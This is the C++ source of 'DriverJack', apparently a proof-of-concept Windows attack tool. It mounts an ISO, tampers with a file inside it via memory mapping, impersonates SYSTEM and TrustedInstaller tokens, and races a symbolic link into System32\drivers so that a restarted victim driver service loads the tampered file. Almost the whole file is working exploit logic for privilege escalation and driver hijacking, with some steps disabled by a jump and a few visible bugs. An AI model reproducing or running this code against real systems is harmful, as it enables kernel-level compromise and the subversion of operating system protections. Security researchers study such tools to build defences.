// DriverJack.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <inttypes.h>
#include <initguid.h>
#include <windows.h>
#include <cstdio>
#include <string>
#include <vector>
#include <virtdisk.h>
#include <shlwapi.h>
#include "DriverJack.h"
#include "stringutils.h"
#include "ImpersonateUtils.h"
#include "DriveUtils.h"
#include "Threading.h"


#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "virtdisk.lib")

// Function to mount an ISO file using AttachVirtualDisk
HANDLE MountISO(const std::string& isoPath) {

    DWORD LastError = 0;

    VIRTUAL_STORAGE_TYPE storageType = {};
    storageType.DeviceId = VIRTUAL_STORAGE_TYPE_DEVICE_ISO;
    storageType.VendorId = VIRTUAL_STORAGE_TYPE_VENDOR_UNKNOWN;

    ATTACH_VIRTUAL_DISK_PARAMETERS attachParameters = {};
    attachParameters.Version = ATTACH_VIRTUAL_DISK_VERSION_1;

    OPEN_VIRTUAL_DISK_PARAMETERS openParameters;
    openParameters.Version = OPEN_VIRTUAL_DISK_VERSION_1;
    openParameters.Version1.RWDepth = OPEN_VIRTUAL_DISK_RW_DEPTH_DEFAULT;

    HANDLE virtualDiskHandle;
    PCWSTR isoPathWide = (PCWSTR)AnsiToWide(isoPath.c_str());

    printf("(*) Attempting to open: %ws\n", isoPathWide);
    /*
        DWORD OpenVirtualDisk(
            [in]           PVIRTUAL_STORAGE_TYPE         VirtualStorageType,
            [in]           PCWSTR                        Path,
            [in]           VIRTUAL_DISK_ACCESS_MASK      VirtualDiskAccessMask,
            [in]           OPEN_VIRTUAL_DISK_FLAG        Flags,
            [in, optional] POPEN_VIRTUAL_DISK_PARAMETERS Parameters,
            [out]          PHANDLE                       Handle
        );
    */
    LastError = OpenVirtualDisk(&storageType, isoPathWide, VIRTUAL_DISK_ACCESS_GET_INFO | VIRTUAL_DISK_ACCESS_ATTACH_RO | VIRTUAL_DISK_ACCESS_DETACH, OPEN_VIRTUAL_DISK_FLAG_NONE, &openParameters, &virtualDiskHandle);

    if (LastError != ERROR_SUCCESS) {
        // If return value of OpenVirtualDisk isn't ERROR_SUCCESS, there was a problem opening the VHD
        printf("(-) Error Opening Virtual Disk: %08x\n", LastError);
        return nullptr;
    }

    /*
        DWORD AttachVirtualDisk(
            [in]           HANDLE                          VirtualDiskHandle,
            [in, optional] PSECURITY_DESCRIPTOR            SecurityDescriptor,
            [in]           ATTACH_VIRTUAL_DISK_FLAG        Flags,
            [in]           ULONG                           ProviderSpecificFlags,
            [in, optional] PATTACH_VIRTUAL_DISK_PARAMETERS Parameters,
            [in, optional] LPOVERLAPPED                    Overlapped
        );
    */
    LastError = AttachVirtualDisk(virtualDiskHandle, 0, ATTACH_VIRTUAL_DISK_FLAG_READ_ONLY | ATTACH_VIRTUAL_DISK_FLAG_PERMANENT_LIFETIME, 0, &attachParameters, 0);

    if (LastError != ERROR_SUCCESS) {
        // If return value of AttachVirtualDisk isn't ERROR_SUCCESS, there was a problem attach the disk
        printf("(-) Error Attaching Virtual Disk: %08x\n", LastError);
        DetatchVirtualImage(virtualDiskHandle);
        return nullptr;
    }

    // Close the handle as we don't need it for further operations
    // CloseHandle(virtualDiskHandle);
    return virtualDiskHandle;

}

PWSTR GetPhysicalDrivePath(HANDLE virtualDiskHandle) {
	DWORD LastError = 0;
    WCHAR physicalDrive[MAX_PATH];
	WCHAR* physicalDriveContainer = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR));
    memset(physicalDriveContainer, MAX_PATH * sizeof(WCHAR), 0);
	ULONG bufferSize = sizeof(physicalDrive);

	/*
    		DWORD GetVirtualDiskPhysicalPath(
            	[in]  HANDLE VirtualDiskHandle,
      			[out] PULONG DiskPathSizeInBytes,
                [out] PWSTR  DiskPath
            );
    */
	LastError = GetVirtualDiskPhysicalPath(virtualDiskHandle, &bufferSize, physicalDrive);

    if (LastError != ERROR_SUCCESS) {
		// If return value of GetVirtualDiskPhysicalPath isn't ERROR_SUCCESS, there was a problem getting the physical path
		printf("(-) Error Getting Physical Path: %08x\n", LastError);
		return nullptr;
	}
    if(physicalDriveContainer != nullptr){
        memcpy(physicalDriveContainer, physicalDrive, bufferSize);
    }

	return physicalDriveContainer;
}

bool DetatchVirtualImage(HANDLE virtualImageHandle) {
    DWORD LastError = 0;

    LastError = DetachVirtualDisk(virtualImageHandle, DETACH_VIRTUAL_DISK_FLAG_NONE, 0);

    if (LastError != ERROR_SUCCESS) {
        // If return value of AttachVirtualDisk isn't ERROR_SUCCESS, there was a problem attach the disk
        printf("(-) Error Attaching Virtual Disk: %08x\n", LastError);
        return false;
    }
    return true;
    
}


// Function to find the drive letter of the mounted ISO
char FindMountedDriveLetter(const std::string& isoPath, DWORD driveNumber) {
    DWORD  bufferSize = MAX_PATH;
    char volumeName[MAX_PATH];
    char driveLetter = 'X';
    bool hadTrailingBackslash = false;

    HANDLE findHandle = FindFirstVolumeA(volumeName, bufferSize);
    if (findHandle == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "FindFirstVolume failed with error code %ld\n", GetLastError());
        return '\0';
    }

    do {
        size_t index = strlen(volumeName) - 1;
        if (volumeName[0] != '\\' || volumeName[1] != '\\' || volumeName[2] != '?' || volumeName[3] != '\\' || volumeName[index] != '\\') {
            fprintf(stderr, "Incorrect volume name format: %s\n", volumeName);
            continue;
        }

        if (hadTrailingBackslash = volumeName[index] == '\\') {
            volumeName[index] = 0;
        }

        HANDLE hVolume = CreateFileA(volumeName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hVolume == INVALID_HANDLE_VALUE) {
            fprintf(stderr, "CreateFile failed with error code %ld\n", GetLastError());
            continue;
        }

        VOLUME_DISK_EXTENTS diskExtents;
        DWORD bytesReturned;
        BOOL success = DeviceIoControl(hVolume, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, NULL, 0, &diskExtents, sizeof(diskExtents), &bytesReturned, NULL);
        if (!success) {
            fprintf(stderr, "DeviceIoControl failed with error code %ld\n", GetLastError());
            CloseHandle(hVolume);
            continue;
        }

        printf("(*) Disk number: %d\n", diskExtents.Extents[0].DiskNumber);
        printf("(*) Volume name: %s\n", volumeName);

        if (diskExtents.Extents[0].DiskNumber == driveNumber) {
            if (hadTrailingBackslash) {
                volumeName[index] = '\\';
            }
            printf("(+) Found drive at %s\n", volumeName);
            SetVolumeMountPointA("X:\\", volumeName);

            //driveLetter = volumeName[4];
            break;

        }
        CloseHandle(hVolume);
    } while (FindNextVolumeA(findHandle, volumeName, bufferSize));

    FindVolumeClose(findHandle);
    return driveLetter; // No match, damn it!
}

void* FileToBuffer(const std::string& filePath, PLARGE_INTEGER lpFileSize) {
    // Convert file path to wide string
    std::wstring wFilePath(filePath.begin(), filePath.end());

    // Open the file
    HANDLE hFile = CreateFile(
        wFilePath.c_str(),            // File path
        GENERIC_READ,                 // Desired access
        FILE_SHARE_READ,              // Share mode
        NULL,                         // Security attributes
        OPEN_EXISTING,                // Creation disposition
        FILE_ATTRIBUTE_NORMAL,        // Flags and attributes
        NULL                          // Template file
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return nullptr;
    }

    // Get the file size
    if (!GetFileSizeEx(hFile, lpFileSize)) {
        CloseHandle(hFile);
        return nullptr;
    }

    // Allocate buffer
    DWORD fileSize = static_cast<DWORD>(lpFileSize->QuadPart);
    void* buffer = malloc(fileSize);
    if (buffer == nullptr) {
        CloseHandle(hFile);
        return nullptr;
    }

    // Read the file content
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        free(buffer);
        CloseHandle(hFile);
        return nullptr;
    }

    if (bytesRead != fileSize) {
        free(buffer);
        CloseHandle(hFile);
        return nullptr;
    }

    // Close the file
    CloseHandle(hFile);

    return buffer;
}


// Function to map a file in memory
void* MapFileInMemory(const std::string& filePath, PLARGE_INTEGER lpFileSize) {
    HANDLE hFile = CreateFileA(filePath.c_str(), MAXIMUM_ALLOWED, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error opening file: %ld\n", GetLastError());
        return nullptr;
    }

    DWORD LastError = GetFileSizeEx(hFile, lpFileSize);
    if (LastError == 0) {
        fprintf(stderr, "Error getting file size: %ld\n", GetLastError());
    }

    HANDLE hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    if (hMapFile == NULL) {
        fprintf(stderr, "Error creating file mapping: %ld\n", GetLastError());
        CloseHandle(hFile);
        return nullptr;
    }

    void* pMapView = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (pMapView == NULL) {
        fprintf(stderr, "Error mapping view of file: %ld\n", GetLastError());
        CloseHandle(hMapFile);
        CloseHandle(hFile);
        return nullptr;
    }

    CloseHandle(hMapFile);
    CloseHandle(hFile);
    return pMapView;
}



std::vector<std::string> getListOfDrives() {
    std::vector<std::string> arrayOfDrives;
    char* szDrives = new char[MAX_PATH]();
    if (GetLogicalDriveStringsA(MAX_PATH, szDrives)){
        for (int i = 0; i < 100; i += 4){
            if (szDrives[i] != (char)0){
                arrayOfDrives.push_back(std::string{ szDrives[i],szDrives[i + 1],szDrives[i + 2] });
            }
        }
    }
    delete[] szDrives;
    return arrayOfDrives;
}


int MountAndTamper(char* rawIso, char* innerFile, char* victimFile, char* action) {
    // System Service Token
    HANDLE hTokenSystem = NULL;
    // TrustedInstaller Service Token
    HANDLE hTokenTrustedInstaller = NULL;

    // Target SymLink
    std::string link = "C:\\Windows\\System32\\drivers\\";
    link.append(victimFile);
    link.append(".sys:");
    link.append(gen_random(8));
    
    // Target Driver Name
    std::string victimDriver = victimFile;

    // Target Service
    LPCWSTR svcName = AnsiToWide(victimDriver.c_str());

    // Path to ISO file
    std::string isoPath = std::string(rawIso);
    // Drive-relative path to file inside ISO
    std::string innerFilePath = std::string(innerFile);

    // Get list of drives before mounting ISO
    std::vector<std::string> drives = getListOfDrives();
    // Drive letter of mounted ISO
    std::string drivePath;

    // srand for random string generation
    srand((unsigned)time(NULL));

    HANDLE vhd = MountISO(isoPath);

    for (auto drive : getListOfDrives()) {
        bool found = false;
        for (auto drive2 : drives) {
            if (drive == drive2) {
				found = true;
				break;
			}
        }
        if (!found) {
            printf("(>) New Drive: %s\n", drive.c_str());
            drivePath = drive;
        }
		
	}

    if (vhd != nullptr) {
		PWSTR physicalDrive = GetPhysicalDrivePath(vhd);
		DWORD driveNumber = ExtractNumberFromPath(physicalDrive);

		wprintf(L"(*) Physical Drive: %s\n", physicalDrive);
		printf("(*) Drive Number: %d\n", driveNumber);
		printf("(*) Mounted Drive Letter: %s\n", drivePath.c_str());
        getchar();

        // Print a message: try to tamper content of file inside ISO
        drivePath.append(innerFilePath);

        printf("(*) Modifying file %s in mapped drive...\n", drivePath.c_str());
        LARGE_INTEGER fileSize;
        LARGE_INTEGER fileSize2;
        PVOID pFile = MapFileInMemory(drivePath, &fileSize);
        
        UINT64 fileSize64 = fileSize.QuadPart;
        DWORD oldProtect;

        if (pFile != nullptr) {
			printf("(*) File mapped in memory at address: %p\n", pFile);
			printf("(*) File content: %08x\n", *(UINT*)pFile);
			printf("(*) Tampering %" PRIu64 " bytes of file content...\n", fileSize64);
            
            if(strcmp(action, "xor") == 0){
                fileSize64 = xor_encode(pFile, fileSize64);
			}
            else if (strcmp(action, "overwrite") == 0) {
                memset(pFile, 0x90, fileSize64);
                void* buffer = FileToBuffer("C:\\Windows\\System32\\calc.exe", &fileSize2);

                VirtualProtect(pFile, fileSize.QuadPart, PAGE_EXECUTE_READWRITE, &oldProtect);
                printf("(*) Rewriting %" PRIu64 " bytes of file content...\n", fileSize2.QuadPart);
                memcpy(pFile, buffer, fileSize2.QuadPart);

                free(buffer);
            }
            else if (strcmp(action, "hijack") == 0) {
                memset(pFile, 0x90, fileSize64);
                void* buffer = FileToBuffer("C:\\Windows\\System32\\calc.exe", &fileSize2);

                VirtualProtect(pFile, fileSize.QuadPart, PAGE_EXECUTE_READWRITE, &oldProtect);
                printf("(*) Rewriting %" PRIu64 " bytes of file content...\n", fileSize2.QuadPart);
                memcpy(pFile, buffer, fileSize2.QuadPart);

                free(buffer);
            }


            FlushViewOfFile(pFile, fileSize.QuadPart);
            UnmapViewOfFile(pFile);

            printf("(*) File content: %08x\n", *(UINT*)pFile);
			printf("(*) Modified %" PRIu64 " bytes of content : % 08x\n", fileSize64, *(UINT*)pFile);
            
        }
        std::string target = std::string(drivePath);

		goto wait;

        //DoStopSvc(L"WudfPf");


        if (!ElevateSystem(&hTokenSystem)) {
			printf("(-) Error Elevating to System\n");
            goto cleanup;
		}

        printf("(+) Obtained SYSTEM Token HANDLE 0x%p.\n", hTokenSystem);
        if (!SetThreadToken(NULL, hTokenSystem)) {
            printf("(-) (SYSTEM) SetThreadToken failed. Error: %d.\n", GetLastError());
            goto cleanup;
        }

        if (!ElevateTrustedInstaller(&hTokenTrustedInstaller)) {
			printf("(-) Error Elevating TrustedInstaller\n");
            goto cleanup;
		}

        printf("(+) Obtained TrustedInstaller Token HANDLE 0x%p.\n", hTokenSystem);

        if (!SetThreadToken(NULL, hTokenTrustedInstaller)) {
			printf("(-) (TrustedInstaller) SetThreadToken failed. Error: %d.\n", GetLastError());
			goto cleanup;
		}

        if (!BackupDriver(victimDriver.c_str())) {
            printf("(-) Error Backing up driver\n");
        }

        if (DoReStartSvcAsync(victimDriver.c_str())) {

            DWORD LastError = 0;
            INT counter = 0;
            printf("(*) Trying to create symlink %s <<===>> %s\n", target.c_str(), link.c_str());

            while (LastError == 0) {
                LastError = CreateSymbolicLinkA(link.c_str(), target.c_str(), SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE);
                counter++;

                if (counter == 500000) {
                    printf("(-) Error Creating Symbolic Link: %08x\n", GetLastError());
                    break;
                }
            }
        }

        // DoStartSvc(svcName);
        // DriverRace(svcName, link.c_str(), target.c_str());

    wait:

        printf("(*) Press any key 5 times to end the program...\n");
        for (int i = 0; i < 5; i++){
            getchar();
        }

    cleanup:
        //DoStopSvc(AnsiToWide(victimDriver.c_str()));
        DeleteFileA(link.c_str());
        DetatchVirtualImage(vhd);
        DeleteFileA(link.c_str());
        
        if (PathFileExistsA(victimDriver.c_str())) {
            printf("(+) Driver Restored\n");
        }
        else {
            printf("(-) Error Restoring Driver\n");
        }

        if (hTokenSystem != NULL)
			CloseHandle(hTokenSystem);
        if (hTokenTrustedInstaller != NULL)
            CloseHandle(hTokenTrustedInstaller);

    }
    return 0;
}


void printHelp() {
    printf("Usage: program [options]\n");
    printf("Options:\n");
    printf("  -input <file>     Specify the input file\n");
    printf("  -driver <file>    Specify the driver name file\n");
    printf("  -victim <file>    Specify the victim driver name file\n");
    printf("  -help             Display this help message\n");
}

int main(int argc, char* argv[]) {
    char* inputFile = NULL;
    char* driverFile = NULL;
    char* victimFile = NULL;
    char* action = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-help") == 0) {
            printHelp();
            return 0;
        }
        else if (strcmp(argv[i], "-input") == 0) {
            if (i + 1 < argc) {
                inputFile = argv[++i];
            }
            else {
                fprintf(stderr, "Error: -input option requires one argument.\n");
                return 1;
            }
        }
        else if (strcmp(argv[i], "-action") == 0) {
            if (i + 1 < argc) {
                action = argv[++i];
            }
            else {
                fprintf(stderr, "Error: -action option requires one argument.\n");
                return 1;
            }
        }
        else if (strcmp(argv[i], "-driver") == 0) {
            if (i + 1 < argc) {
                driverFile = argv[++i];
            }
            else {
                fprintf(stderr, "Error: -driver option requires one argument.\n");
                return 1;
            }
        }
        else if (strcmp(argv[i], "-victim") == 0) {
            if (i + 1 < argc) {
                victimFile = argv[++i];
            }
            else {
                fprintf(stderr, "Error: -victim option requires one argument.\n");
                return 1;
            }
        }
        else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            printHelp();
            return 1;
        }
    }

    if (!inputFile || !driverFile || !victimFile) {
        fprintf(stderr, "All of -input and -driver and -victim options are required.\n");
        printHelp();
        return 1;
    }
    if (!action) {
        action = (char*)"xor";
    }

    printf("(I) Input File: %s\n", inputFile);
    printf("(I) Driver Name File: %s\n", driverFile);
    printf("(I) Victim Driver Name File: %s\n", victimFile);

    MountAndTamper(inputFile, driverFile, victimFile, action);


    return 0;
}
